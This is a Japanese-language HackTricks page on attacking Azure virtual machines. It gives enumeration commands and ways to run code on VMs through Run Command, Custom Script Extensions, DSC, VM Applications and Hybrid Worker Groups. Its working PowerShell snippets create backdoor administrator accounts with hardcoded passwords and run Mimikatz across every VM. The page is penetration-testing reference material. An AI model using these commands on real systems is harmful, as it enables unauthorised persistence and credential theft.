# Az - 仮想マシンとネットワーク

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする。
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## 基本情報

[ドキュメントから：](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure 仮想マシンは、Azure が提供する[オンデマンドでスケーラブルなコンピューティングリソース](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)のいくつかのタイプの1つです。通常、他の選択肢よりもコンピューティング環境をより細かく制御する必要がある場合に仮想マシンを選択します。この記事では、仮想マシンを作成する前に考慮すべき事項、作成方法、および管理方法についての情報を提供します。

## Azureネットワーク情報

Azureネットワークには**異なるエンティティと構成方法**が含まれています。異なるAzureネットワークエンティティの**簡単な説明**、**例**、および**列挙**コマンドを以下で見つけることができます:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**は、Azureポータルを介してSSL経由で完全に管理されたRDP（リモートデスクトッププロトコル）およびSSH（セキュアシェル）アクセスソリューションを提供します。これはAzure仮想ネットワーク内に統合されており、プライベートIPを使用してVMにRDPおよびSSH接続を許可し、パブリックIPの必要性を回避します。これにより、VMアクセスのためのパブリックIPの割り当てやNSGルールの構成を必要とする従来の方法に比べて、より安全で便利な代替手段となります。開発者やITスタッフは、Webブラウザを使用してAzureポータルからVMに安全にアクセスでき、開発およびテスト環境のプロセスを効率化できます。

サブスクリプション内のすべてのAzure Bastionホストをリストするには、次のコマンドを使用できます:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## VMの列挙

{% endcode %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VMでコマンドを実行する**

### **VMでのAADログイン**

AzureADを経由して認証されたユーザーにアクセスを許可することが可能です。たとえば、**Linux VM** にアクセスしようとする場合: `ssh username@azure-corp.com@1.1.1.1`（ログインしようとしているときに使用したazurecorpのメールを**使用する**ことが重要です）エラーが発生する可能性があります:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

単に**これらの手順に従って**、[https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) に移動し、コードを指定し、メールアドレスとパスワードを資格情報として使用して、SSH経由で接続できます（そのユーザーがそのようにするための十分な権限を持っている場合：`Virtual Machine Administrator Login`または`Virtual Machine User Login`ロール）。

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **カスタムスクリプト拡張機能の実行**

Azure仮想マシン（VM）拡張機能は、Azure VM上での**ポストデプロイメント構成**および自動化**タスク**を提供する**小さなアプリケーション**です。たとえば、仮想マシンにソフトウェアのインストール、ウイルス対策、またはスクリプトの実行が必要な場合、VM拡張機能を使用できます。

したがって、書き込みアクセス権がある場合、任意のコードを実行できます：
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC)は、コードを介してホストを設定するために使用されるAnsibleに類似したPowerShellツールです。DSCはAzureと統合されており、特定の構成ファイルをアップロードできます。これらのファイルは厳密な構文に従う必要があります。特筆すべきは、AzureのDSC拡張機能は、DSCの標準に合致しないファイルからコマンドを実行できますが、提供された図に示されているように、構文がDSCの基準に合致しなくてもコマンドを実行できます。

これらのコマンドの実行は、Az PowerShellの[**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)関数によって容易に行われます。要件には、定義された関数を持つ**.PS1**ファイルと、**.zip**ファイルに圧縮する必要があります。DSCの構文が正確でなくてもコードは実行されます。ただし、拡張機能は実行ステータスを「失敗」とマークし、ステータスが失敗メッセージによって上書きされるため、コマンドからの出力は表示されません。

### VM Application Definitions

VM Application Definitionsを使用すると、バージョン管理されたアプリケーションをAzure VMに繰り返し展開できます。このリソースは、複数のVMにわたるアプリケーションの展開と更新をサポートします。これを設定するには、Az PowerShellの**`New-AzGalleryApplication`**や**`New-AzGalleryApplicationVersion`**などのコマンドを使用するいくつかのステップが必要です。

この方法でアプリケーションやコマンドを実行する際には、**"VMAppExtension"**が関与します。この拡張機能は、アプリケーションがVMに適用されると自動的にインストールされます。拡張機能は、指定されたURIからファイルを取得し、アプリケーションと同じ名前で拡張子なしで保存します。ファイルを正しく実行するには、REST API呼び出しの「ManageActions」フィールドを構成して、ファイルを適切な拡張子でリネームする必要があります。この方法の設定が完了すると、提供された図に示されている構造に似ています。

ただし、この実行方法は比較的遅く、アプリケーションやコマンドを実行するのに約3〜4分かかります。このプロセスに関連するファイルは、アプリケーションのコピー用の特定のディレクトリ（`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`）および実行ステータス用のディレクトリ（`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`）に保存されます。

両方のテクニックは、Azure環境でコマンドを実行したりアプリケーションを展開したりするための独自の要件、ステップ、および考慮事項を持っており、それぞれ固有の方法を提供しています。

### AzureのHybrid Worker Groups (HWGs)

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)は、Azureの機能であり、Automation Accountで構成されたRunbookを指定されたHWGの一部であるAzure仮想マシン（VM）で実行できるようにします。この実行は、VMにインストールされた拡張機能によって行われ、RunbookコードがVMに展開されます。このプロセスの重要な側面は、実際の資格情報が実行に影響を与えないことです。なぜなら、コードは特に**SYSTEM**またはrootとして昇格権限で実行されるからです。提供された図に示されているように。

Windows 10 VMを利用するユーザーにとって重要な詳細は、RunbookのPowerShellバージョンを指定する必要があることです。これは、PowerShell 7.1がこれらのVMにデフォルトでインストールされていないため、バージョン7.1を指定するとスクリプトの実行が失敗するためです。

Azureのこの機能は、ハイブリッド環境全体でのタスクの自動化と管理に堅牢な方法を提供し、Azure VM上でのタスクの集中管理と実行を可能にします。


## 参考文献

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学びましょう</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したり、HackTricksをPDFでダウンロードしたり**する場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォローする。**
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する。

</details>
